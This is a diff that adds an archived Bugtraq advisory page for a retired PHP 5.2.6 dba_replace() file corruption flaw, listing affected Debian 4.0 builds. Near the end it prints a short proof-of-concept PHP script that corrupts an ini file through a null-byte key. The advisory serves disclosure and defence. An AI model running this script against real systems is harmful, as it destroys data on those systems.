@@ -1,0 +1,134 @@
+#SpeeDr00t@Black Falcon<br>#bid33498<p><b><span style="font-size: 18pt;">RETIRED: PHP 'dba_replace() ' File Corruption Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/33498/info">info</a><br><a href="http://www.securityfocus.com/bid/33498/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/33498/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/33498/solution">solution</a><br><a href="http://www.securityfocus.com/bid/33498/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				33498
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 28 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 29 2009 09:09PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Maksymilian Arciemowicz
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					PHP PHP 5.2.6 <br/>
+					
+				
+					Debian Linux  4.0 sparc<br/>
+					
+				
+					Debian Linux  4.0 s/390<br/>
+					
+				
+					Debian Linux  4.0 powerpc<br/>
+					
+				
+					Debian Linux  4.0 mipsel<br/>
+					
+				
+					Debian Linux  4.0 mips<br/>
+					
+				
+					Debian Linux  4.0 m68k<br/>
+					
+				
+					Debian Linux  4.0 ia-64<br/>
+					
+				
+					Debian Linux  4.0 ia-32<br/>
+					
+				
+					Debian Linux  4.0 hppa<br/>
+					
+				
+					Debian Linux  4.0 arm<br/>
+					
+				
+					Debian Linux  4.0 amd64<br/>
+					
+				
+					Debian Linux  4.0 alpha<br/>
+					
+				
+					Debian Linux  4.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example script is available: <br/><br/># cat /www/dba.ham.php<br/>&amp;lt;?php<br/>$source=dba_open("/www/about.ini", "wlt", "inifile");<br/>dba_replace("\0","/www/",$source);<br/>?&amp;gt;<br/># php /www/dba.ham.php<br/># cat /www/about.ini<br/>#
+	
+		<ul>
+</ul>
+</div>
